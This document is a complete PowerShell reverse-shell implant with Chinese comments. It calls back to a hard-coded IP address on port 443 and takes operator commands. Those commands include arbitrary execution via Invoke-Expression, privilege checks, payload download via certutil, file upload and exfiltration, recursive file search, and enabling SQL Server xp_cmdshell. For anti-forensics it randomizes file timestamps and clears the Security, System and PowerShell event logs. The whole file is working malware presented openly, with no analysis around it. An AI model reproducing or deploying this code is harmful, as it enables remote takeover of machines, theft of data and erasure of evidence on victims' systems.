$address = "20.89.63.60"
$port = "443"

while ($true) {

  do {
    try {
      Write-Host "Trying to reach "$address":"$port
      $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
      $stream = $client.GetStream()
      $writer = New-Object System.IO.StreamWriter($stream)
      $reader = New-Object System.IO.StreamReader($stream)
      break
    }
    catch {
      Start-Sleep -s 1
    }

  } while ($true)

  Write-Host "Connected"

  do {

    try {

      $cmd_type = $reader.ReadLine()

    }
    catch {

      try {
        Write-Host "Trying to reach "$address":"$port
        $client = New-Object System.Net.Sockets.TcpClient($address, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        Continue
      }
      catch {
        Write-Host "Reconnecting to the server....." -Foreground "Red";
      }

    }

    switch ($cmd_type) {

      1 {
                    
        $cmd = ""
                    
        while ($cmd.ToLower() -ne 'exit') {
           
          try {
            #获取当前路径
            $path = Get-Location
            #传回当前路径
            $writer.WriteLine($path)
            $writer.Flush()

            $cmd = $reader.ReadLine()
            If ($cmd.ToLower() -eq 'exit') { Break }
            try { $output = (Invoke-Expression $cmd) } catch { $output = "Command Error!" }
            $writer.WriteLine($output -join "`|`|")
            $writer.Flush()
            $cmd = ''
          }
          catch { Break }
        }
                    
      }
      2 { 
        try {
                    
          $whoami = Invoke-Expression "whoami"

          $WhoamiPriv = whoami /priv
                      
          $Path = (Get-Location).Path
                      
          if ($WhoamiPriv.count -gt "10") { $WhoamiPriv = "High-level-Permissions" } else { $WhoamiPriv = "Low-Level-Permissions" }
                      
          $output = " Current_User: $whoami Current_Permissions: $WhoamiPriv  Current_Path: $Path"
                      
          $writer.WriteLine($output)
                      
          $writer.Flush()

        }
        catch { Break }

      }
      3 {
        $url = $reader.ReadLine()
        $certutil = cmd /c certutil -urlcache -split -f $url
        if ($certutil -match "000000  ...") { $output = "Download Success!" } else { $output = "Download Faile!" }
        $writer.WriteLine($output)
        $writer.Flush() 
      }
      4 { 
                  
        $FilePath = $reader.ReadLine()

        if (Test-Path "$FilePath") {

          $date1 = Get-ChildItem | Select-Object LastWriteTime | Get-Random
          $date2 = Get-ChildItem | Select-Object LastWriteTime | Get-Random
          $date3 = Get-ChildItem | Select-Object LastWriteTime | Get-Random

          $(Get-Item $FilePath).lastaccesstime = $date1.LastWriteTime
          $(Get-Item $FilePath).creationtime = $date2.lastwritetime
          $(Get-Item $FilePath).lastwritetime = $date3.LastWriteTime

          $output = "$FilePath File Time Randomization Success!"
          $writer.WriteLine($output)
          $writer.Flush()

        }
        else {

          $output = "Path document does not exist"
          $writer.WriteLine($output)
          $writer.Flush()

        }

      }
      5 {

        try { $connectionStr = $reader.ReadLine() } catch { Break }
        Function New-SqlConnection([string]$connectionStr) {
          $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
          $SqlConnection.ConnectionString = $connectionStr
          try {
            $SqlConnection.Open()
            Write-Host 'Connected to sql server.'
            return $SqlConnection #返回数据库连接的信息
          }
          catch [exception] {
            Write-Warning ('Connect to database failed with error message:{0}' -f , $_)
            $SqlConnection.Dispose()
            return $null
          }
        }

        Function GetSqlEnd {
          param
          (
            [System.Data.SqlClient.SqlConnection]$SqlConnection,
            [string]$query
          )
          $dataSet = new-object "System.Data.DataSet" "WrestlersDataset"
          $dataAdapter = new-object "System.Data.SqlClient.SqlDataAdapter" ($query, $SqlConnection)
          $dataAdapter.Fill($dataSet) | Out-Null
          return $dataSet.Tables | Select-Object -First 1
        }

        $sql = ''

        while ($true) {

          try { $sql = $reader.ReadLine() } catch { Break }
                                
          if ($sql -eq 'exit') { Break }

          if ($sql -eq "Enable_xp_cmdshell") { $sql = "exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure" }

          try { $output = (GetSqlEnd -query $sql -SqlConnection $connectionStr).output } catch { $output = "SQL Command Error!" }

          $writer.WriteLine([string]$output)
          $writer.Flush()

          $sql = ''

        }




      }
      6 {
        Write-Output "MENU: 2. Upload File."
        #远端在验证路径
        Remove-Variable iswritable, iscontinue -ErrorAction SilentlyContinue
        $iscontinue = $reader.ReadLine()
        If ($iscontinue -ne "Upload continue.") { Break }
        #验证本地路径可写
        $dest_file = $reader.ReadLine()
        If (Test-Path $dest_file) {
          $dest_file_tmp = $dest_file + ".bak"
          Move-Item -Path $dest_file -Destination $dest_file_tmp -Force
        }
        Try { [System.IO.File]::WriteAllBytes($dest_file, '') }
        Catch { $iswritable = 0 }
        If (Test-Path $dest_file) { Remove-Item $dest_file -Force }
        If ($iswritable -ne 0) {
          $writer.WriteLine("Remote path is writable.")
          $writer.Flush()
        }
        Else {
          $writer.WriteLine("Remote path is not writable.")
          $writer.Flush()
          Break
        }
        # 开始传输
        try {
          $file_string_content = $reader.ReadLine()
          $file_string_content_split = $file_string_content.Split(" ")
          $file_string_content_split_len = $file_string_content_split.Count
          $byte_array = New-Object Byte[] $file_string_content_split_len
          for ([int] $i = 0; $i -lt $file_string_content_split_len; $i++) {
            $byte_array[$i] = $file_string_content_split[$i]
          }
          [System.IO.File]::WriteAllBytes($dest_file, $byte_array)
          $new_file_content = [System.IO.File]::ReadAllBytes($dest_file)
          certutil -decode $dest_file "$dest_file.tmp" | Out-Null
          $new_file_content_len = $new_file_content.Length
          Remove-Item -Path $dest_file
          Move-Item "$dest_file.tmp" $dest_file
          $writer.WriteLine($new_file_content_len)
          $writer.Flush()
          $upload_result = $reader.ReadLine()
          If ($upload_result -eq "File Upload Successfully.") {
            Write-Host "File Upload Successfully. [${dest_file}]" -Foreground Green
          }
          Elseif ($upload_result -eq "File Upload Failed.") {
            Write-Host "File Upload Failed." -Foreground RED
          }
        }
        catch { break }

      }
      7 {
        Write-Output "MENU: 3. Download File."
        $local_file = $reader.ReadLine()
        Try {
          If (Test-Path $local_file) {
            $writer.WriteLine("FileExist")
            $writer.Flush()
          }
          Else {
            $writer.WriteLine("FileNotExist")
            $writer.Flush()
            Break
          }
          $local_binary_content = [System.IO.File]::ReadAllBytes($local_file)
          $local_string_content = [string]$local_binary_content
          $writer.WriteLine($local_string_content)
          $writer.Flush()
          $remote_file_len = $reader.ReadLine()
          $local_file_len = $local_binary_content.Count

          if ($remote_file_len -eq $local_file_len) {
            $writer.WriteLine("Download Successfully.")
            $writer.Flush()
            Write-Host "Download Successfully." -Foreground Green
          }
          elseif ($remote_file_len -ne $local_file_len) {
            $writer.WriteLine("Download Failed.")
            $writer.Flush()
            Write-Host "Download Failed." -Foreground RED
          }
          Start-Sleep -Seconds 3
        }
        Catch { Break }
      }
      8 {

        Remove-Variable SearchPath -ErrorAction SilentlyContinue

        try{  $SearchPath = $reader.ReadLine()}  catch { Break }

       try{
            While ($SearchPath.ToLower() -ne 'exit') {

                If (-NOT $SearchPath) {$SearchPath = $reader.ReadLine()}

                $FileName = $reader.ReadLine()

                $GetFileList = @(Get-ChildItem -Path $SearchPath  -recurse $FileName)

                $output = $GetFileList.FullName -join '|'

                $writer.WriteLine($output)

                $writer.Flush()

                Remove-Variable SearchPath -ErrorAction SilentlyContinue

            }
        }  catch { }

        Break

      }
      Exit {

        try {
          
          Clear-eventlog "Windows PowerShell"
          Clear-eventlog "Security"
          Clear-EventLog "System"

          $output = "1"
        } catch {
          $output = "0"
        }

        $writer.WriteLine($output)
        $writer.Flush()

        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()

        Remove-Variable writer,reader,stream,client -ErrorAction SilentlyContinue

        Exit

      }


      Default {
      }
    }

  } while ($true)
}

